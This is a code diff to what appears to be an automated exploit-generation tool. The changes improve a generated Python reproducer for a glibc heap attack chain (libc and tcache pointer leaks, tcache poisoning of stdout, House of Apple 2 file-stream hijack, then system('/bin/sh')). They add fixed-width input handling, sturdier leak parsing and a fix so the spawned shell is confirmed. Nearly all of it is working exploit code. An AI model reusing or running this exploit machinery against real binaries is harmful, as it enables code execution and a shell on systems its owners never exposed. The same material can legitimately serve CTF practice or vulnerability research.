@@ -1835,12 +1835,14 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
 
 
 def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
-                       poison_size=0x300, guard_size=0x430) -> bytes:
+                       poison_size=0x300, guard_size=0x430, width=None) -> bytes:
     """A self-contained, stdlib-based reproducer for the automated glibc-heap -> shell chain
     (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
     Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
     heap page are recovered live; only the libc OFFSETS (measured at build time) are embedded. The
-    menu is driven with the same op templates the exploit used."""
+    menu is driven with the same op templates, field width and leak extraction the exploit used, so
+    the shipped reproducer replays exactly what was confirmed (line-based OR fixed-width fields, and
+    a view that prints a prompt before the raw chunk bytes)."""
     ops = {k: (v if isinstance(v, str) else v.decode("latin-1")) for k, v in menu_ops.items()}
     return (
         "#!/usr/bin/env python3\n"
@@ -1848,23 +1850,32 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "import os, select, struct, subprocess, sys, time\n"
         "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
         f"OPS={ops!r}\n"
+        f"WIDTH={int(width) if width else None!r}   # fixed-width read(fd,buf,W) fields, or None (lines)\n"
         f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
         f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
         f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
-        "def render(t, idx=None, size=None, data=b''):\n"
-        "    head, sep, tail = t.partition('{data}')\n"
+        "SIZES={}\n"
+        "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
         "    def sub(s):\n"
         "        if idx is not None: s=s.replace('{idx}',str(idx))\n"
         "        if size is not None: s=s.replace('{size}',str(size))\n"
-        "        return s.encode()\n"
-        "    out=sub(head)\n"
-        "    if sep: out+=(data if isinstance(data,(bytes,bytearray)) else str(data).encode())+sub(tail)\n"
+        "        return s\n"
+        "    if WIDTH:   # each scalar padded to WIDTH bytes, the data buffer NUL-padded to its chunk size\n"
+        "        out=b''\n"
+        "        for f in t.split('\\n'):\n"
+        "            if not f: continue\n"
+        "            if f=='{data}': out+=bytes(data).ljust(dsize,b'\\x00')[:dsize] if dsize else bytes(data)\n"
+        "            else: out+=(sub(f).encode()+b' '*WIDTH)[:WIDTH]\n"
+        "        return out\n"
+        "    head, sep, tail = t.partition('{data}')\n"
+        "    out=sub(head).encode()\n"
+        "    if sep: out+=bytes(data)+sub(tail).encode()\n"
         "    return out\n"
-        "def ADD(i,s,d): return render(OPS['add'],i,s,d)\n"
+        "def ADD(i,s,d): SIZES[i]=s; return render(OPS['add'],i,s,d,dsize=s)\n"
         "def FREE(i): return render(OPS['free'],i)\n"
         "def VIEW(i): return render(OPS['view'],i)\n"
-        "def EDIT(i,d): return render(OPS['edit'],i,data=d)\n"
-        "EXIT=OPS['exit_seq'].encode()\n"
+        "def EDIT(i,d): return render(OPS['edit'],i,data=d,dsize=SIZES.get(i))\n"
+        "EXIT=render(OPS['exit_seq'])\n"
         "def read_until(p, deadline, quiet=0.2):\n"
         "    out=b''; last=time.time()\n"
         "    while time.time()<deadline:\n"
@@ -1886,14 +1897,25 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
         "def op(seq,secs=0.35):\n"
         "    p.stdin.write(seq); p.stdin.flush(); return read_until(p, time.time()+secs)\n"
-        "def ptr(o): return struct.unpack('<Q', o[:8].ljust(8,b'\\x00')[:8])[0] if o else 0\n"
+        "def windows(o):   # 8-byte pointer candidates; pure-ASCII windows are prompt text\n"
+        "    for i in range(max(0,len(o)-7)):\n"
+        "        w=o[i:i+8]\n"
+        "        if all(b==0 or 0x20<=b<=0x7e for b in w): continue\n"
+        "        yield i, struct.unpack('<Q',w)[0]\n"
         "read_until(p, time.time()+0.5)\n"
         "op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
-        "leak=ptr(op(VIEW(0),0.5)); base=leak-UNSORTED_OFF\n"
-        "assert base>0 and base%0x1000==0, 'libc leak failed: %#x'%leak\n"
+        "vo=op(VIEW(0),0.5); base=None; off=0\n"
+        "for i,v in windows(vo):   # the page-aligned main_arena fd; its offset = where raw bytes begin\n"
+        "    if v<(1<<47) and v-UNSORTED_OFF>0 and (v-UNSORTED_OFF)%0x1000==0: base=v-UNSORTED_OFF; off=i; break\n"
+        "assert base, 'libc leak failed: %s'%vo[:32].hex()\n"
         "stdout_addr=base+STDOUT_OFF\n"
         "op(ADD(2,POISON,b'C')); op(ADD(3,POISON,b'D')); op(FREE(2))\n"
-        "heap=ptr(op(VIEW(2),0.5)); assert heap, 'heap leak failed'\n"
+        "ho=op(VIEW(2),0.5); heap=0\n"
+        "if len(ho)>=off+8:   # the safe-linked fd sits at the same offset as the libc fd did\n"
+        "    c=struct.unpack('<Q',ho[off:off+8])[0]\n"
+        "    if 0<c<(1<<40): heap=c\n"
+        "if not heap: heap=next((v for _,v in windows(ho) if 0<v<(1<<40)),0)\n"
+        "assert heap, 'heap leak failed'\n"
         "op(ADD(2,POISON,b'C')); op(FREE(3)); op(FREE(2))\n"
         "op(EDIT(2, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(4,POISON,b'E'))\n"
         "blob=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
@@ -2017,7 +2039,11 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
             p.stdin.write(exit_seq)
             p.stdin.flush()
             time.sleep(0.3)
-            p.stdin.write(b"echo " + marker + b"\n")
+            # Lead with a newline: a FIXED-WIDTH exit_seq is padded to exactly W bytes and carries NO
+            # newline (that is what the target's read(fd,buf,W) expects), so without this the spawned
+            # shell's first line is "5<pad>echo <marker>" -- the marker becomes an argument to a bogus
+            # command and never echoes, failing the confirmation on an exploit that actually worked.
+            p.stdin.write(b"\necho " + marker + b"\n")
             p.stdin.flush()
         except (BrokenPipeError, OSError):
             return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
